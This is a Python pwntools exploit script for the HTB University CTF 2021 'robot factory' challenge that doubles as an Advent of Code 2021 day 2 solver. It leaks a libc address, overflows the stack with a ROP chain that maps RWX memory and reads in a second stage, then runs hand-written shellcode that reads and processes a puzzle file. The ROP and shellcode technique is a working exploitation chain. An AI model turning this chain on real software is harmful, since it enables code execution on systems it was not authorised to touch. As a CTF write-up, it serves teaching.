#!/usr/bin/env python3

'''
This is both a solve to the "robot factory" challenge from HTB University ctf 2021,
_and_ a solution to day 2 of Advent of Code 2021.

I added some additional limitations;
  * Do not use the fact that the robot factory binary is non-PIE
  * Assume the puzzle input is stored on the remote, i.e. read it from disk in shellcode

As I don't want to redistribute their binary, I added a compatible victim
binary that just contains the two types of operation used in this exploit.

If you have the original robot_factory binary, patch it so it has a local
rpath to pull in the correct libc, rename it to "robot_factory_patched", and run:

> python3 day2b.py ORIG

Otherwise, use the victim binary from this repo and run this script.

Finally, the exploit is not 100% stable, but it should work  roughly
30% of the time. (Which is way better than it was during the CTF :P)
'''

import time
from pwn import *

context.update(arch='amd64', os='linux')
binary_path = "./victim/bots"
libc_offset = 0x805150
if args.ORIG:
    binary_path = "./robot_factory_patched"
    libc_offset = 0x85c138

e = context.binary = ELF(binary_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)


if args.GDB:
    # b * 0x0000000000401810
    p = gdb.debug(e.path, '''
    c
    ''')
else:
    p = process(e.path)

SIZE = 0x10000

def add_bot(bot_type, op_type, data1, data2, wait=True):
    assert bot_type == b"n" or bot_type == b"s"
    assert op_type in b"asm"

    if wait:
        p.sendlineafter(b"(n/s) >", bot_type)
    else:
        p.sendline(bot_type)
    p.sendlineafter(b"(a/s/m) >", op_type)

    p.sendlineafter(b"1: ", data1)
    # Either size: or 2:
    p.sendlineafter(b": ", data2)


# Get a library leak
add_bot(b"n", b"a", b"1", b"2")
p.recvuntil(b"Result: ")
leak = int(p.recvline())

log.info(f"Leaked libc addr: {hex(leak)}")
libc.address = leak + libc_offset
log.info(f"Placing libc base at: {hex(libc.address)}")

assert libc.address > 0x6f0000000000
assert libc.address < 0x8f0000000000


# 0x00000000001056fd: pop rdx; pop rcx; pop rbx; ret; 
pop_rdx_pop_rcx_pop_rbx_ret = next(libc.search(asm("pop rdx; pop rcx; pop rbx; ret")))
# 0x00000000000c9ccf: xor r9d, r9d; mov eax, r9d; ret; 
xor_r9d = next(libc.search(asm("xor r9d, r9d; mov eax, r9d; ret;")))
# 0x000000000011c371: pop rdx; pop r12; ret; 
pop_rdx_pop_r12_ret = next(libc.search(asm("pop rdx; pop r12; ret;")))

pop_rsi_ret = next(libc.search(asm("pop rsi; ret;")))
pop_rdi_ret = next(libc.search(asm("pop rdi; ret;")))
ret = next(e.search(asm("ret;")))

payload  = b""
payload += b"A"*(24+8) # padding + cookie
payload += b"0"*8 # RBP

# This ROP chain can't be too large, we just need to get enough
# in to stage a mmap call, a read and a ret to a known value

# mmap (0x13370000,  size,  R|W|X, P|A|F, _,   0)
#       RDI          RSI    RDX    RCX,   R8,  R9
payload += p64(pop_rdx_pop_rcx_pop_rbx_ret)
payload += p64(7) # RDX
payload += p64(constants.MAP_PRIVATE | constants.MAP_ANONYMOUS | constants.MAP_FIXED)
payload += b'3'*8 # RBX

payload += p64(pop_rdi_ret)
payload += p64(0x13370000)
payload += p64(pop_rsi_ret)
payload += p64(SIZE)
payload += p64(xor_r9d)
payload += p64(libc.sym.mmap)

# Next, read into the RWX buffer
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += p64(0x13370000)
payload += p64(pop_rdx_pop_r12_ret)
payload += p64(SIZE)
payload += b"x"*8 # padding
payload += p64(libc.sym.read)

# Jump to shellcode
payload += p64(0x13370000 + 0x1000 + 0x4000)

payload += (0xf0 - len(payload)) * b"A"

assert not b"\n" in payload
log.info("Sending ROP chain...")
add_bot(b"s", b"m", payload, b"10", wait=False)

log.info("Environment setup complete :D")
log.info("Time to run some assembly")
# Dev environment complete, now we can move on to solving AoC.
# We'll do it in assembly of course.

# We'll load some handy dandy strings first
payload  = b"example.txt\0\0\0\0\0"
payload  = b"input.txt\0\0\0\0\0\0\0"
payload += b"All done, your lucky number is: 0x"
payload += (0x1000 - len(payload)) * b"\0"

# The next part is reserved for our input. (No mallocs here)
payload += 0x4000 * b"\0"

# Now we can finally get to writing some asm.
# Oh, and before you get judgemental, no, I will not be checking any error
# codes, what do you think this is? a real dev environment?.
payload += asm('''
        mov RBP, RSP
        sub RSP, 0x100
        mov R11, 0xfffffffffffff000
        and RSP, R11

        // Open 'inputs.txt'
        // open("inputs.txt", 0, 0)
        mov RDI, 0x13370000
        xor RSI, RSI
        xor RDX, RDX
        mov EAX, 2
        syscall

        // Read the entire file into the
        // dedicated part of the mmap
        // read(RAX, 0x13371000, 0x4000)
        mov RDI, RAX
        mov RSI, 0x13371000
        mov RDX, 0x4000
        mov EAX, 0
        syscall

        // R10 points to the start of the buffer
        // R12 points to the end of the buffer
        mov R12, RAX
        add R12, 0x13371000
        mov R10, 0x13371000

        // Now we can resolve the rest of the
        // challenge in one pass over the entire
        // buffer. We will be a bit sloppy here
        // but again, this dev enviroment is already
        // extremely questionable.
        // 
        // R10: buf ptr
        // R11: clobber (kernel required)
        // R12: end of buffer
        // R13: aim
        // R14: depth
        // R15: horizontal

        xor R13, R13
        xor R14, R14
        xor R15, R15

        handle_line:
        cmp byte PTR [R10], 'u'
        jne  not_up
        call handle_up
        not_up:
        cmp byte PTR [R10], 'd'
        jne not_down
        call handle_down
        not_down:
        cmp byte PTR [R10], 'f'
        jne  not_forward
        call handle_forward
        not_forward:


        call get_next_line
        jmp handle_line

        handle_up:
        add R10, 3
        call convert_num
        sub R13, RAX
        RET

        handle_down:
        add R10, 5
        call convert_num
        add R13, RAX
        RET

        handle_forward:
        add R10, 8
        call convert_num
        // Add to our horizontal pos
        add R15, RAX
        // Calculate and add depth based on our aim
        mul R13
        add R14, RAX
        RET

        convert_num:
        movzx RAX, byte ptr [R10]
        sub RAX, '0'
        RET

        // Move R10 to the next line, i.e. the
        // next character after the new line
        // TODO; bounds check
        get_next_line:
        // Check if we're still in bounds of the buffer
        cmp R10, R12
        jge done

        // Otherwise, continue finding the next line
        inc R10
        cmp byte ptr [R10], '\\n'
        jne get_next_line
        inc R10
        ret

        done:

        // Calculate the final result
        mov RAX, R15
        mul R14

        // Set R10 to the destination
        mov R10, 0x13370032
        // Convert the string to hex
        mov R11, 0xf000000000000000
        hex_loop:
        mov RBX, RAX
        and RBX, R11
        shr RBX, 124

        // Convert to chars
        add RBX, '0'
        cmp RBX, '9'
        jle skip_char
        // Add 7 extra s.t. 10 becomes A
        add RBX, 7
        skip_char:
        mov byte ptr [R10], BL
        inc R10
        shl RAX, 4
        test RAX, RAX
        jnz hex_loop

        // Print the output
        mov RDI, 1
        mov RSI, 0x13370010
        mov RDX, 0x40
        mov RAX, 1
        syscall

        // Exit gracefully
        xor RDI, RDI
        mov RAX, 60
        syscall
''')


time.sleep(0.5)
log.info(f"Sending second stage payload ({len(payload)} bytes)")
p.sendline(payload)

egg = b"All done"
p.recvuntil(egg)
result  = egg
result += p.recvuntil(b"\0", drop=True)
result = result.decode()

num = int(result.split("0x")[1], 16)

log.info(f"Response from victim: {result}\n")
log.info(f"In decimal: {num}\n")

